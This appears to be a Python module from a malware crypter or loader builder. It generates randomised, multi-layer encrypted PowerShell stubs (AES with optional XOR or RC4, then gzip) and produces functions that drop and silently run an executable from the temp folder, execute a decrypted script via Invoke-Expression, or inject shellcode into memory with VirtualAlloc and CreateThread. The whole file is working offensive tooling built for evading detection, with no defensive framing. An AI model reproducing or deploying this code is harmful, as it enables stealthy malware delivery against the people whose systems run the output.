import random
from utils import rand_var, rand_str, rand_class_name


def _split_b64(enc_b64):
    if len(enc_b64) < 100:
        v = rand_var()
        return f'{v}="{enc_b64}"', v
    parts = random.randint(2, 4)
    chunk_size = len(enc_b64) // parts
    chunks = []
    for i in range(parts):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i < parts - 1 else len(enc_b64)
        chunks.append(enc_b64[start:end])
    var_names = [rand_var() for _ in chunks]
    lines = [f'{var_names[i]}="{chunks[i]}"' for i in range(len(chunks))]
    v_combined = rand_var()
    lines.append(f'{v_combined}={"+".join(var_names)}')
    return "\n".join(lines), v_combined


def _aes_variant_a(v_enc, key_b64, iv_b64):
    v_key = rand_var()
    v_iv = rand_var()
    v_aes = rand_var()
    v_dec = rand_var()
    v_raw = rand_var()
    lines = [
        f'{v_key}=[Convert]::FromBase64String("{key_b64}")',
        f'{v_iv}=[Convert]::FromBase64String("{iv_b64}")',
        f'{v_aes}=New-Object System.Security.Cryptography.AesManaged',
        f'{v_aes}.Mode=[System.Security.Cryptography.CipherMode]::CBC',
        f'{v_aes}.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7',
        f'{v_aes}.KeySize=256;{v_aes}.Key={v_key};{v_aes}.IV={v_iv}',
        f'{v_dec}={v_aes}.CreateDecryptor()',
        f'{v_raw}={v_dec}.TransformFinalBlock({v_enc},0,{v_enc}.Length)',
        f'{v_dec}.Dispose();{v_aes}.Dispose()',
    ]
    return lines, v_raw


def _aes_variant_b(v_enc, key_b64, iv_b64):
    v_key = rand_var()
    v_iv = rand_var()
    v_aes = rand_var()
    v_dec = rand_var()
    v_raw = rand_var()
    lines = [
        f'{v_key}=[Convert]::FromBase64String("{key_b64}")',
        f'{v_iv}=[Convert]::FromBase64String("{iv_b64}")',
        f'{v_aes}=[System.Security.Cryptography.Aes]::Create()',
        f'{v_aes}.Mode="CBC"',
        f'{v_aes}.Padding="PKCS7"',
        f'{v_aes}.KeySize=256;{v_aes}.Key={v_key};{v_aes}.IV={v_iv}',
        f'{v_dec}={v_aes}.CreateDecryptor({v_key},{v_iv})',
        f'{v_raw}={v_dec}.TransformFinalBlock({v_enc},0,{v_enc}.Length)',
        f'{v_dec}.Dispose();{v_aes}.Dispose()',
    ]
    return lines, v_raw


def _aes_variant_c(v_enc, key_b64, iv_b64):
    v_key = rand_var()
    v_iv = rand_var()
    v_aes = rand_var()
    v_dec = rand_var()
    v_raw = rand_var()
    lines = [
        f'{v_key}=[Convert]::FromBase64String("{key_b64}")',
        f'{v_iv}=[Convert]::FromBase64String("{iv_b64}")',
        f'{v_aes}=New-Object System.Security.Cryptography.RijndaelManaged',
        f'{v_aes}.BlockSize=128;{v_aes}.KeySize=256',
        f'{v_aes}.Mode=[System.Security.Cryptography.CipherMode]::CBC',
        f'{v_aes}.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7',
        f'{v_aes}.Key={v_key};{v_aes}.IV={v_iv}',
        f'{v_dec}={v_aes}.CreateDecryptor()',
        f'{v_raw}={v_dec}.TransformFinalBlock({v_enc},0,{v_enc}.Length)',
        f'{v_dec}.Dispose();{v_aes}.Dispose()',
    ]
    return lines, v_raw


def _aes_variant_d(v_enc, key_b64, iv_b64):
    v_key = rand_var()
    v_iv = rand_var()
    v_raw = rand_var()
    v_ns = rand_class_name()
    lines = [
        f'{v_key}=[Convert]::FromBase64String("{key_b64}")',
        f'{v_iv}=[Convert]::FromBase64String("{iv_b64}")',
        f'Add-Type -TypeDefinition @"\nusing System;using System.Security.Cryptography;using System.IO;\npublic class {v_ns}{{\npublic static byte[] D(byte[] d,byte[] k,byte[] v){{\nusing(var a=Aes.Create()){{a.Key=k;a.IV=v;a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;\nusing(var c=a.CreateDecryptor()){{return c.TransformFinalBlock(d,0,d.Length);}}}}}}\n}}\n"@',
        f'{v_raw}=[{v_ns}]::D({v_enc},{v_key},{v_iv})',
    ]
    return lines, v_raw


def _gzip_variant_a(v_raw):
    v_ms = rand_var()
    v_gz = rand_var()
    v_out = rand_var()
    v_buf = rand_var()
    v_read = rand_var()
    lines = [
        f'{v_ms}=New-Object System.IO.MemoryStream(,{v_raw})',
        f'{v_gz}=New-Object System.IO.Compression.GZipStream({v_ms},[System.IO.Compression.CompressionMode]::Decompress)',
        f'{v_out}=New-Object System.IO.MemoryStream',
        f'{v_buf}=New-Object byte[] 65536',
        f'do{{{v_read}={v_gz}.Read({v_buf},0,{v_buf}.Length);if({v_read} -gt 0){{{v_out}.Write({v_buf},0,{v_read})}}}}while({v_read} -gt 0)',
        f'{v_gz}.Dispose();{v_ms}.Dispose()',
    ]
    return lines, v_out


def _gzip_variant_b(v_raw):
    v_ms = rand_var()
    v_gz = rand_var()
    v_out = rand_var()
    lines = [
        f'{v_ms}=[System.IO.MemoryStream]::new({v_raw})',
        f'{v_gz}=[System.IO.Compression.GZipStream]::new({v_ms},[System.IO.Compression.CompressionMode]::Decompress)',
        f'{v_out}=[System.IO.MemoryStream]::new()',
        f'{v_gz}.CopyTo({v_out})',
        f'{v_gz}.Dispose();{v_ms}.Dispose()',
    ]
    return lines, v_out


def _gzip_variant_c(v_raw):
    v_out = rand_var()
    v_ns = rand_class_name()
    lines = [
        f'Add-Type -TypeDefinition @"\nusing System;using System.IO;using System.IO.Compression;\npublic class {v_ns}{{\npublic static byte[] G(byte[] d){{\nusing(var m=new MemoryStream(d))using(var g=new GZipStream(m,CompressionMode.Decompress))using(var o=new MemoryStream()){{g.CopyTo(o);return o.ToArray();}}}}\n}}\n"@',
        f'{v_out}=[System.IO.MemoryStream]::new([{v_ns}]::G({v_raw}))',
    ]
    return lines, v_out


def _inner_decrypt(mode, enc_info, v_raw, lines):
    if mode == "xor_aes":
        xor_key_b64 = enc_info["xor_key_b64"]
        v_xk = rand_var()
        v_xored = rand_var()
        lines.append(f'{v_xk}=[Convert]::FromBase64String("{xor_key_b64}")')
        lines.append(f'{v_xored}=New-Object byte[] {v_raw}.Length')
        lines.append(f'for($i=0;$i -lt {v_raw}.Length;$i++){{{v_xored}[$i]={v_raw}[$i]-bxor {v_xk}[$i%{v_xk}.Length]}}')
        return v_xored
    elif mode == "rc4_aes":
        rc4_key_b64 = enc_info["rc4_key_b64"]
        v_rk = rand_var()
        v_s = rand_var()
        v_j = rand_var()
        v_rc4out = rand_var()
        lines.append(f'{v_rk}=[Convert]::FromBase64String("{rc4_key_b64}")')
        lines.append(f'{v_s}=0..255;{v_j}=0')
        lines.append(f'for($i=0;$i -lt 256;$i++){{{v_j}=({v_j}+{v_s}[$i]+{v_rk}[$i%{v_rk}.Length])%256;$t={v_s}[$i];{v_s}[$i]={v_s}[{v_j}];{v_s}[{v_j}]=$t}}')
        lines.append(f'{v_rc4out}=New-Object byte[] {v_raw}.Length;$i=0;{v_j}=0')
        lines.append(f'for($k=0;$k -lt {v_raw}.Length;$k++){{$i=($i+1)%256;{v_j}=({v_j}+{v_s}[$i])%256;$t={v_s}[$i];{v_s}[$i]={v_s}[{v_j}];{v_s}[{v_j}]=$t;{v_rc4out}[$k]={v_raw}[$k]-bxor {v_s}[({v_s}[$i]+{v_s}[{v_j}])%256]}}')
        return v_rc4out
    return v_raw


def _ps_decrypt_stub(enc_b64, enc_info):
    mode = enc_info["mode"]
    key_b64 = enc_info["aes_key_b64"]
    iv_b64 = enc_info["aes_iv_b64"]

    split_code, v_b64 = _split_b64(enc_b64)
    v_enc = rand_var()

    lines = [split_code]
    lines.append(f'{v_enc}=[Convert]::FromBase64String({v_b64})')

    aes_variant = random.choice([_aes_variant_a, _aes_variant_b, _aes_variant_c, _aes_variant_d])
    aes_lines, v_raw = aes_variant(v_enc, key_b64, iv_b64)
    lines.extend(aes_lines)

    v_raw = _inner_decrypt(mode, enc_info, v_raw, lines)

    gzip_variant = random.choice([_gzip_variant_a, _gzip_variant_b, _gzip_variant_c])
    gz_lines, v_out = gzip_variant(v_raw)
    lines.extend(gz_lines)

    return "\n".join(lines), v_out


def exe_drop(enc_b64, enc_info, exe_name, hidden=True):
    decrypt_code, v_out = _ps_decrypt_stub(enc_b64, enc_info)
    v_path = rand_var()
    start_flag = '-WindowStyle Hidden' if hidden else ''

    return f'''{decrypt_code}
{v_path}="$env:TEMP\\{exe_name}"
[System.IO.File]::WriteAllBytes({v_path},{v_out}.ToArray())
{v_out}.Dispose()
Start-Process -FilePath {v_path} {start_flag}
Start-Sleep -Seconds 2
Remove-Item -Path {v_path} -Force -ErrorAction SilentlyContinue
'''


def ps1_exec(enc_b64, enc_info, hidden=True):
    decrypt_code, v_out = _ps_decrypt_stub(enc_b64, enc_info)
    v_script = rand_var()

    return f'''{decrypt_code}
{v_script}=[System.Text.Encoding]::UTF8.GetString({v_out}.ToArray())
{v_out}.Dispose()
Invoke-Expression {v_script}
'''


def shellcode_inject(enc_b64, enc_info):
    decrypt_code, v_out = _ps_decrypt_stub(enc_b64, enc_info)
    v_sc = rand_var()
    v_addr = rand_var()
    v_ns = rand_class_name()

    return f'''Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class {v_ns}{{
[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint fl,IntPtr t);
[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}}
"@
{decrypt_code}
{v_sc}={v_out}.ToArray();{v_out}.Dispose()
{v_addr}=[{v_ns}]::VirtualAlloc([IntPtr]::Zero,[uint]{v_sc}.Length,0x3000,0x04)
[System.Runtime.InteropServices.Marshal]::Copy({v_sc},0,{v_addr},{v_sc}.Length)
$old=0;[{v_ns}]::VirtualProtect({v_addr},[UIntPtr]::new({v_sc}.Length),0x20,[ref]$old)|Out-Null
$t=[{v_ns}]::CreateThread([IntPtr]::Zero,0,{v_addr},[IntPtr]::Zero,0,[IntPtr]::Zero)
[{v_ns}]::WaitForSingleObject($t,0xFFFFFFFF)|Out-Null
'''
